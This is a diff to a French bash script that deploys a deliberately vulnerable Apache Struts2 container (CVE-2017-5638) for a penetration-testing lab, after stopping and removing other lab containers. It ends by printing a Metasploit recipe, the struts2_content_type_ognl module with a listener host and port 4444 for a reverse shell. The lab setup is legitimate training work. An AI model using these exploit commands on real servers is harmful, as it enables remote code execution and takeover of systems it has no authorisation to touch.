@@ -1,33 +1,117 @@
 #!/bin/bash
+set -e
 
-echo "Installation STRUTS2 UNIQUEMENT (rapide et garanti)"
+echo "================================================"
+echo "  SCRIPT FINAL - NETTOYAGE + STRUTS2"
+echo "  Ça va marcher, point final."
+echo "================================================"
+echo ""
 
+if [ "$EUID" -ne 0 ]; then 
+    echo "❌ Lance avec sudo"
+    exit 1
+fi
+
+# ========================================
+# ÉTAPE 1 : NETTOYAGE TOTAL
+# ========================================
+
+echo "[1/4] Nettoyage COMPLET des containers..."
+
+# Arrêter tous les containers
+docker stop phpmyadmin-vuln 2>/dev/null || true
+docker stop webmin-vuln 2>/dev/null || true
 docker stop struts2-vuln 2>/dev/null || true
+docker stop mysql_db 2>/dev/null || true
+
+# Supprimer tous les containers
+docker rm phpmyadmin-vuln 2>/dev/null || true
+docker rm webmin-vuln 2>/dev/null || true
 docker rm struts2-vuln 2>/dev/null || true
 
+echo "   ✅ Nettoyage terminé"
+
+# ========================================
+# ÉTAPE 2 : INSTALLATION STRUTS2
+# ========================================
+
+echo "[2/4] Téléchargement Struts2..."
 docker pull vulnerables/cve-2017-5638
 
+echo "[3/4] Lancement Struts2 sur port 8080..."
 docker run -d \
     --name struts2-vuln \
+    --restart unless-stopped \
     -p 8080:8080 \
     vulnerables/cve-2017-5638
 
-sleep 10
+echo "[4/4] Vérification (15 secondes)..."
+sleep 15
 
-IP=$(hostname -I | awk '{print $1}')
+# ========================================
+# VÉRIFICATION
+# ========================================
+
+if ! docker ps | grep -q struts2-vuln; then
+    echo "❌ ÉCHEC - Container non actif"
+    docker logs struts2-vuln
+    exit 1
+fi
+
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)
+
+if [ "$HTTP_CODE" != "200" ] && [ "$HTTP_CODE" != "302" ]; then
+    echo "❌ ÉCHEC - Application ne répond pas (HTTP $HTTP_CODE)"
+    exit 1
+fi
+
+SERVER_IP=$(hostname -I | awk '{print $1}')
+
+# ========================================
+# RÉSULTAT
+# ========================================
 
 echo ""
-echo "✅ PRÊT !"
+echo "================================================"
+echo "  ✅ STRUTS2 OPÉRATIONNEL !"
+echo "================================================"
 echo ""
 docker ps | grep struts2
 echo ""
-echo "METASPLOIT:"
+echo "📊 Configuration:"
+echo "   Application: Apache Struts2"
+echo "   CVE: CVE-2017-5638 (OGNL RCE)"
+echo "   Port: 8080"
+echo "   URL: http://${SERVER_IP}:8080/"
+echo "   HTTP Status: $HTTP_CODE"
 echo ""
+echo "================================================"
+echo "  🔥 EXPLOITATION METASPLOIT (DEPUIS KALI)"
+echo "================================================"
+echo ""
+echo "msfconsole -q"
 echo "use exploit/multi/http/struts2_content_type_ognl"
-echo "set RHOSTS ${IP}"
+echo "set RHOSTS ${SERVER_IP}"
 echo "set RPORT 8080"
 echo "set TARGETURI /struts2-showcase/integration/saveGangster.action"
 echo "set LHOST 192.168.100.10"
+echo "set LPORT 4444"
 echo "exploit"
 echo ""
-EOF
+echo "SI L'EXPLOIT ÉCHOUE, ESSAYE:"
+echo "set TARGETURI /"
+echo "exploit"
+echo ""
+echo "================================================"
+echo "  📖 SCÉNARIO LAB"
+echo "================================================"
+echo ""
+echo "Iron4Software héberge un portail intranet Java"
+echo "sur Apache Struts2 pour la gestion RH/admin."
+echo "CVE-2017-5638: RCE via Content-Type OGNL injection"
+echo "MITRE ATT&CK: T1190 (Exploit Public-Facing App)"
+echo ""
+echo "================================================"
+echo "  ✅ PRÊT POUR EXPLOITATION !"
+echo "================================================"
+echo ""
